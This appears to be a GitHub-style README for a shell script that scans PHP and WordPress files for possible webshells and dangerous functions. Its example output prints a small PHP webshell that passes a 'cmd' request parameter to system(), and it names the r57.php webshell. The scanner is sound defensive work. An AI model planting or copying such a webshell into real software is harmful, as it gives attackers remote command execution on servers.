**Description:**

Simple script for detect possible backdoors in files PHP. (Good for the Wordpress PHP files.)


**Usage:**
```
$ ./findbackdoor.sh 

 Opção Inválida!

 Use: ./findbackdoor.sh <diretorio para o scan> <1 ou 2>
  1 = WebShells
  2 = Functions

$ ./findbackdoor.sh /home/espreto/Test/Plugin_WP/ 1

[+] Possible webshell found!
/home/espreto/Test/Plugin_WP/example/r57.php

$ ./findbackdoor.sh /home/espreto/Test/Plugins_WP/ 2

[+] Possible danger function!
/home/espreto/Test/Plugins_WP/i.php

1-<?php
2-if(isset($_REQUEST[‘cmd’])){
3-        echo "<pre>";
4-        $cmd = ($_REQUEST[‘cmd’]);
5:        system($cmd);
6-        echo "</pre>";
7-        die;
8-}
9-?>

$
```

**TODO:**

Missing some features, but it's a start. 
Please PR me. ;)


[]s

